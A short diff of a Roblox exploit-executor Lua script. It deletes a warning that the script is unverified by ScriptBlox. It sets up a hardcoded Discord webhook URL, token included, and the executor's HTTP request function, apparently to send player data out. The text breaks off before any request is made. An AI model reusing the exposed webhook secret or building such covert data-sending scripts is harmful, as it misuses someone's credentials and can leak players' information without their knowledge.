@@ -1,15 +1,11 @@
---[[
-	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
-]]
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local localPlayer = Players.LocalPlayer
 
--- replace with your webhook
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1426452224049025165/i_wxHlwywVw93a8nYDjDKimn4piyd3Jab83QeWZqyDeEg8ZDRzLfzIj8OhRgnRW7kRtM"
 
--- pick the executor's http request function
+
 local requestFunc =
     (syn and syn.request) or
     (http and http.request) or
